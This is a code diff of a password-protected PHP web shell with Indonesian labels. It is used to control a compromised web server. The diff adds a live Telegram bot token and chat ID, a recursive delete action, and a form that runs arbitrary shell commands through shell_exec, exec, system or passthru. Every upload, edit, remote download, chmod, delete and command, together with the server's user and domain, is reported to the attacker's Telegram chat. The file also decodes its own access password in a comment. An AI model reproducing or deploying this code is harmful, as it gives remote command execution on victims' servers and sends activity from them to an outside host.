@@ -1,6 +1,6 @@
 <?php
 session_start();
-$hex_pass = '616c616c6163696e7461'; //
+$hex_pass = '616c616c6163696e7461'; // password 'alalacinta'
 function strToHex($string) {
     $hex = '';
     for ($i=0; $i<strlen($string); $i++) $hex .= dechex(ord($string[$i]));
@@ -28,8 +28,8 @@ if (!isset($_SESSION['fileman_ok'])) {
 if(isset($_GET['logout'])) { session_destroy(); header("Location: ".$_SERVER['PHP_SELF']); exit; }
 
 // Telegram Bot config
-$botToken = 'ISI_TOKEN_BOT_KAMU';
-$chatId   = 'ISI_CHAT_ID_KAMU';
+$botToken = '8161188245:AAFTyqNTbegh0ruXaGrGKzH_oCPeNl4MWmg';
+$chatId   = '7973648686';
 function sendTG($msg){
     global $botToken, $chatId;
     $msg = urlencode($msg);
@@ -43,37 +43,63 @@ $os = php_uname();
 $user = (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) ? posix_getpwuid(posix_geteuid())['name'] : get_current_user();
 $group = (function_exists('posix_getgrgid') && function_exists('posix_getegid')) ? posix_getgrgid(posix_getegid())['name'] : '-';
 $phpver = phpversion();
+$domain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? '-';
 
-// Actions
+// ===== DELETE ACTION ====
+function rrmdir($src) {
+    if(is_dir($src)){
+        $files = scandir($src);
+        foreach($files as $file){
+            if ($file == '.' || $file == '..') continue;
+            $path = "$src/$file";
+            if(is_dir($path)) rrmdir($path);
+            else @unlink($path);
+        }
+        @rmdir($src);
+    } else if(is_file($src)) {
+        @unlink($src);
+    }
+}
+if(isset($_GET['delete']) && $_GET['delete']) {
+    $target = "$dir/".$_GET['delete'];
+    if(file_exists($target)){
+        rrmdir($target);
+        sendTG("🗑️ [DELETE]\nUser: $user\nTarget: ".$_GET['delete']."\nPath: $abs_path\nDomain: $domain");
+        header("Location: ".$_SERVER['PHP_SELF']."?d=".urlencode($dir));
+        exit;
+    }
+}
+
+// === Other Actions
 if(isset($_FILES['up'])){
     move_uploaded_file($_FILES['up']['tmp_name'], "$dir/".$_FILES['up']['name']);
-    sendTG("📥 [UPLOAD]\nUser: $user\nFile: ".$_FILES['up']['name']."\nPath: $abs_path");
+    sendTG("📥 [UPLOAD]\nUser: $user\nFile: ".$_FILES['up']['name']."\nPath: $abs_path\nDomain: $domain");
 }
 if(isset($_POST['mkfolder']) && $_POST['foldername']){
     $newfolder = "$dir/".$_POST['foldername'];
     if(!is_dir($newfolder)){
         mkdir($newfolder);
-        sendTG("📂 [CREATE FOLDER]\nUser: $user\nFolder: ".$_POST['foldername']."\nPath: $abs_path");
+        sendTG("📂 [CREATE FOLDER]\nUser: $user\nFolder: ".$_POST['foldername']."\nPath: $abs_path\nDomain: $domain");
     }
 }
 if(isset($_POST['dochmod']) && isset($_POST['chmodfile']) && isset($_POST['chmodval'])){
     $target = "$dir/".$_POST['chmodfile'];
     $chmodval = intval($_POST['chmodval'],8);
     if(@chmod($target, $chmodval)){
-        sendTG("🔑 [CHMOD]\nUser: $user\nTarget: ".$_POST['chmodfile']."\nPermissions: ".$_POST['chmodval']."\nPath: $abs_path");
+        sendTG("🔑 [CHMOD]\nUser: $user\nTarget: ".$_POST['chmodfile']."\nPermissions: ".$_POST['chmodval']."\nPath: $abs_path\nDomain: $domain");
     }
 }
 if(isset($_POST['cfile']) && $_POST['fname']){
     file_put_contents("$dir/".$_POST['fname'], $_POST['fcontent']);
-    sendTG("📝 [CREATE FILE]\nUser: $user\nFile: ".$_POST['fname']."\nPath: $abs_path");
+    sendTG("📝 [CREATE FILE]\nUser: $user\nFile: ".$_POST['fname']."\nPath: $abs_path\nDomain: $domain");
 }
 if(isset($_POST['dlurl']) && $_POST['url'] && $_POST['fname']){
     file_put_contents("$dir/".$_POST['fname'], file_get_contents($_POST['url']));
-    sendTG("🌐 [REMOTE DOWNLOAD]\nUser: $user\nFrom: ".$_POST['url']."\nTo: ".$_POST['fname']."\nPath: $abs_path");
+    sendTG("🌐 [REMOTE DOWNLOAD]\nUser: $user\nFrom: ".$_POST['url']."\nTo: ".$_POST['fname']."\nPath: $abs_path\nDomain: $domain");
 }
 if(isset($_POST['saveedit']) && $_GET['f']){
     file_put_contents("$dir/".$_GET['f'], $_POST['fileedit']);
-    sendTG("✏️ [EDIT FILE]\nUser: $user\nFile: ".$_GET['f']."\nPath: $abs_path");
+    sendTG("✏️ [EDIT FILE]\nUser: $user\nFile: ".$_GET['f']."\nPath: $abs_path\nDomain: $domain");
 }
 if(isset($_POST['dozip']) && $_POST['zipname'] && $_POST['tozip']){
     $zipfile = "$dir/".$_POST['zipname'];
@@ -91,7 +117,7 @@ if(isset($_POST['dozip']) && $_POST['zipname'] && $_POST['tozip']){
             }
         }
         $zip->close();
-        sendTG("🗜️ [ZIP FILE]\nUser: $user\nSource: ".$_POST['tozip']."\nZip: ".$_POST['zipname']."\nPath: $abs_path");
+        sendTG("🗜️ [ZIP FILE]\nUser: $user\nSource: ".$_POST['tozip']."\nZip: ".$_POST['zipname']."\nPath: $abs_path\nDomain: $domain");
     }
 }
 if(isset($_POST['dounzip']) && $_POST['unzipfile']){
@@ -100,8 +126,11 @@ if(isset($_POST['dounzip']) && $_POST['unzipfile']){
     if($zip->open($zipfile) === TRUE){
         $zip->extractTo($dir);
         $zip->close();
-        sendTG("🗜️ [UNZIP]\nUser: $user\nFile: ".$_POST['unzipfile']."\nExtracted to: $abs_path");
+        sendTG("🗜️ [UNZIP]\nUser: $user\nFile: ".$_POST['unzipfile']."\nExtracted to: $abs_path\nDomain: $domain");
     }
+}
+if (isset($_POST['runcmd']) && isset($_POST['cmd'])) {
+    sendTG("💻 [CMD EXECUTE]\nUser: $user\nCommand: ".$_POST['cmd']."\nPath: $abs_path\nDomain: $domain");
 }
 
 // Icon helper
@@ -129,14 +158,16 @@ h2 { margin: 30px 0 10px 0; text-align:center; color:#304c89;}
 table { width:100%; border-collapse:collapse; background:#fafbfc;}
 th,td { padding:10px 6px; text-align:left;}
 tr:nth-child(even) {background:#f1f7fa;}
-a { color:#2d6cdf; text-decoration:none;}
-a:hover { text-decoration:underline;}
+a, .icon-btn { color:#2d6cdf; text-decoration:none;}
+a:hover, .icon-btn:hover { text-decoration:underline;}
 input,button,textarea,select { font-size:1em; border-radius:6px; border:1px solid #ccd2dd; padding:6px; margin:2px 0;}
 input[type=file] { border: none; }
 button.feature-btn { background: #304c89; color: #fff; border:none; padding:7px 18px; cursor:pointer; transition:.2s; margin:0 4px 7px 0; }
 button.feature-btn:hover { background: #587fc6;}
 button, input[type=submit] { background: #304c89; color: #fff; border:none; padding:7px 18px; cursor:pointer; transition:.2s;}
 button:hover, input[type=submit]:hover { background: #587fc6;}
+.icon-btn { font-size:1.3em; background:none; border:none; cursor:pointer; margin-right:7px;}
+.icon-btn.danger { color: #c43636;}
 form { display:inline; }
 .dirnav { margin-bottom:18px; }
 hr { border:0; border-top:1px solid #e3e7ee; margin:30px 0;}
@@ -152,6 +183,9 @@ hr { border:0; border-top:1px solid #e3e7ee; margin:30px 0;}
 function showForm(id){
     document.querySelectorAll('.feature-form').forEach(function(f){f.classList.remove('active');});
     if(document.getElementById(id)) document.getElementById(id).classList.add('active');
+}
+function confirmDelete(filename){
+    return confirm("Yakin hapus '" + filename + "' ?");
 }
 </script>
 </head>
@@ -232,7 +266,25 @@ echo <<<HTML
         <button name=dounzip>Extract</button>
     </form>
 </div>
+<div id="form-cmd" class="feature-form">
+    <form method=post>
+        <input name="cmd" placeholder="ls -al /" style="width:60%;" required>
+        <button name="runcmd">Run</button>
+    </form>
 HTML;
+if (isset($_POST['runcmd']) && isset($_POST['cmd'])) {
+    echo "<div style='margin-top:15px;'><b>Output:</b><br><pre style='background:#222;color:#8bfa7a;padding:12px 10px;border-radius:8px;max-height:400px;overflow:auto;'>";
+    $cmd = $_POST['cmd'];
+    if(function_exists('shell_exec'))      echo htmlspecialchars(shell_exec($cmd));
+    elseif(function_exists('exec')) {
+        $out = []; exec($cmd, $out); echo htmlspecialchars(implode("\n", $out));
+    }
+    elseif(function_exists('system'))      echo htmlspecialchars(system($cmd));
+    elseif(function_exists('passthru'))    passthru($cmd);
+    else echo "CMD tidak bisa dijalankan (semua fungsi eksekusi dinonaktifkan).";
+    echo "</pre></div>";
+}
+echo "</div>";
 
 // Directory navigation and file list
 if ($dir!='.' && $dir!='/') echo "<a href='?d=".dirname($dir)."'>⬆️ Ke Atas</a><br><br>";
@@ -253,8 +305,10 @@ foreach(scandir($dir) as $f) {
         <td>".($isdir?"-":filesize($path)." B")."</td>
         <td>$perm</td>
         <td>";
-    if(!$isdir) echo "<a href='?d=$dir&f=$f'>Lihat/Edit</a> ";
-    echo " <a href='?d=$dir&chmod=$f'>CHMOD</a>";
+    // Tombol aksi
+    if(!$isdir) echo "<a class='icon-btn' title='Lihat/Edit' href='?d=$dir&f=$f'>👁️</a> ";
+    echo "<a class='icon-btn' title='CHMOD' href='?d=$dir&chmod=$f'>⚙️</a> ";
+    echo "<a class='icon-btn danger' title='Hapus' href='?d=$dir&delete=$f' onclick='return confirmDelete(\"$f\")'>🗑️</a>";
     echo "</td></tr>";
 }
 echo "</table>";
